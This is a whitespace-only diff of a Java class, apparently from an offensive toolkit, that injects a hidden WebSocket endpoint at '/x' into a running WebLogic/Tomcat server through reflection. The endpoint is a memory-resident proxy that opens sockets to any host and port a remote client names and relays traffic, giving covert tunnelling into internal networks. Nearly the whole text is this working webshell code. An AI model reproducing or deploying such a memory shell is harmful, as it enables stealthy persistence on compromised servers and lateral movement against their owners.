@@ -39,33 +39,33 @@ public class proxyMSBYNC extends Endpoint {
     static {
         try {
             Thread threadLocal = Thread.currentThread();
-            Field  workEntry   = threadLocal.getClass().getDeclaredField("workEntry");
+            Field workEntry = threadLocal.getClass().getDeclaredField("workEntry");
             workEntry.setAccessible(true);
             weblogic.servlet.provider.ContainerSupportProviderImpl.WlsRequestExecutor wlsRequestExecutor = (ContainerSupportProviderImpl.WlsRequestExecutor) workEntry.get(threadLocal);
-            Field                                                                     field1             = wlsRequestExecutor.getClass().getDeclaredField("connectionHandler");
+            Field field1 = wlsRequestExecutor.getClass().getDeclaredField("connectionHandler");
             field1.setAccessible(true);
             weblogic.servlet.internal.HttpConnectionHandler connectionHandler = (HttpConnectionHandler) field1.get(wlsRequestExecutor);
-            ServletRequestImpl                              request           = connectionHandler.getServletRequest();
-            ServletResponseImpl                             response          = connectionHandler.getServletResponse();
-            ServletContext                                  servletContext    = request.getSession().getServletContext();
-            ServerEndpointConfig                            configEndpoint    = ServerEndpointConfig.Builder.create(proxyMSBYNC.class, "/x").build();
-            WsServerContainer                               container         = (WsServerContainer) servletContext.getAttribute(ServerContainer.class.getName());
-            Map<String, String>                             pathParams        = Collections.emptyMap();
+            ServletRequestImpl request = connectionHandler.getServletRequest();
+            ServletResponseImpl response = connectionHandler.getServletResponse();
+            ServletContext servletContext = request.getSession().getServletContext();
+            ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(proxyMSBYNC.class, "/x").build();
+            WsServerContainer container = (WsServerContainer) servletContext.getAttribute(ServerContainer.class.getName());
+            Map<String, String> pathParams = Collections.emptyMap();
 
 
             response.setHeader(Constants.UPGRADE_HEADER_NAME, Constants.UPGRADE_HEADER_VALUE);
             response.setHeader(Constants.CONNECTION_HEADER_NAME, Constants.CONNECTION_HEADER_VALUE);
             response.setHeader(HandshakeResponse.SEC_WEBSOCKET_ACCEPT, getWebSocketAccept(request.getHeader("Sec-WebSocket-Key")));
             response.setStatus(101);
-            WsHandshakeRequest  wsRequest  = new WsHandshakeRequest(request, pathParams);
+            WsHandshakeRequest wsRequest = new WsHandshakeRequest(request, pathParams);
             WsHandshakeResponse wsResponse = new WsHandshakeResponse();
             configEndpoint.getConfigurator().modifyHandshake(configEndpoint, wsRequest, wsResponse);
             try {
-                List<Extension>      negotiatedExtensionsPhase2 = Collections.emptyList();
-                Transformation       transformation             = null;
-                String               subProtocol                = null;
-                RequestFacade        requestFacade              = getRequestFacade(request);
-                WsHttpUpgradeHandler wsHandler                  = requestFacade.upgrade(WsHttpUpgradeHandler.class);
+                List<Extension> negotiatedExtensionsPhase2 = Collections.emptyList();
+                Transformation transformation = null;
+                String subProtocol = null;
+                RequestFacade requestFacade = getRequestFacade(request);
+                WsHttpUpgradeHandler wsHandler = requestFacade.upgrade(WsHttpUpgradeHandler.class);
                 if (wsHandler != null) {
                     // Tomcat 8 preInit
                     wsHandler.preInit(configEndpoint, container, wsRequest, negotiatedExtensionsPhase2, subProtocol, transformation, pathParams, request.isSecure());
@@ -80,16 +80,16 @@ public class proxyMSBYNC extends Endpoint {
         }
     }
 
-    long                                       i    = 0;
-    ByteArrayOutputStream                      baos = new ByteArrayOutputStream();
-    HashMap<String, AsynchronousSocketChannel> map  = new HashMap<String, AsynchronousSocketChannel>();
+    long i = 0;
+    ByteArrayOutputStream baos = new ByteArrayOutputStream();
+    HashMap<String, AsynchronousSocketChannel> map = new HashMap<String, AsynchronousSocketChannel>();
 
     private static RequestFacade getRequestFacade(HttpServletRequest request) {
         if (request instanceof RequestFacade) {
             return (RequestFacade) request;
         } else if (request instanceof HttpServletRequestWrapper) {
-            HttpServletRequestWrapper wrapper        = (HttpServletRequestWrapper) request;
-            HttpServletRequest        wrappedRequest = (HttpServletRequest) wrapper.getRequest();
+            HttpServletRequestWrapper wrapper = (HttpServletRequestWrapper) request;
+            HttpServletRequest wrappedRequest = (HttpServletRequest) wrapper.getRequest();
             return getRequestFacade(wrappedRequest);
         } else {
             throw new IllegalArgumentException("Cannot convert [" + request.getClass() + "] to org.apache.catalina.connector.RequestFacade");
@@ -98,13 +98,13 @@ public class proxyMSBYNC extends Endpoint {
 
     private static String getWebSocketAccept(String key) {
         byte[] WS_ACCEPT = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11".getBytes(StandardCharsets.ISO_8859_1);
-        byte[] digest    = ConcurrentMessageDigest.digestSHA1(key.getBytes(StandardCharsets.ISO_8859_1), WS_ACCEPT);
+        byte[] digest = ConcurrentMessageDigest.digestSHA1(key.getBytes(StandardCharsets.ISO_8859_1), WS_ACCEPT);
         return Base64.encodeBase64String(digest);
     }
 
     void readFromServer(Session channel, AsynchronousSocketChannel client) {
         final ByteBuffer buffer = ByteBuffer.allocate(50000);
-        Attach           attach = new Attach();
+        Attach attach = new Attach();
         attach.client = client;
         attach.channel = channel;
         client.read(buffer, attach, new CompletionHandler<Integer, Attach>() {
@@ -113,8 +113,8 @@ public class proxyMSBYNC extends Endpoint {
                 buffer.clear();
                 try {
                     if (buffer.hasRemaining() && result >= 0) {
-                        byte[]     arr = new byte[result];
-                        ByteBuffer b   = buffer.get(arr, 0, result);
+                        byte[] arr = new byte[result];
+                        ByteBuffer b = buffer.get(arr, 0, result);
                         baos.write(arr, 0, result);
                         ByteBuffer q = ByteBuffer.wrap(baos.toByteArray());
                         if (scAttachment.channel.isOpen()) {
@@ -124,8 +124,8 @@ public class proxyMSBYNC extends Endpoint {
                         readFromServer(scAttachment.channel, scAttachment.client);
                     } else {
                         if (result > 0) {
-                            byte[]     arr = new byte[result];
-                            ByteBuffer b   = buffer.get(arr, 0, result);
+                            byte[] arr = new byte[result];
+                            ByteBuffer b = buffer.get(arr, 0, result);
                             baos.write(arr, 0, result);
                             readFromServer(scAttachment.channel, scAttachment.client);
                         }
@@ -149,13 +149,13 @@ public class proxyMSBYNC extends Endpoint {
                 z.flip();
                 z.clear();
             } else if (i == 1) {
-                String                    values      = new String(z.array());
-                String[]                  array       = values.split(" ");
-                String[]                  addrarray   = array[1].split(":");
-                AsynchronousSocketChannel client      = AsynchronousSocketChannel.open();
-                int                       po          = Integer.parseInt(addrarray[1]);
-                InetSocketAddress         hostAddress = new InetSocketAddress(addrarray[0], po);
-                Future<Void>              future      = client.connect(hostAddress);
+                String values = new String(z.array());
+                String[] array = values.split(" ");
+                String[] addrarray = array[1].split(":");
+                AsynchronousSocketChannel client = AsynchronousSocketChannel.open();
+                int po = Integer.parseInt(addrarray[1]);
+                InetSocketAddress hostAddress = new InetSocketAddress(addrarray[0], po);
+                Future<Void> future = client.connect(hostAddress);
                 try {
                     future.get(10, TimeUnit.SECONDS);
                 } catch (Exception ignored) {
@@ -190,6 +190,6 @@ public class proxyMSBYNC extends Endpoint {
 
     static class Attach {
         public AsynchronousSocketChannel client;
-        public Session                   channel;
+        public Session channel;
     }
 }
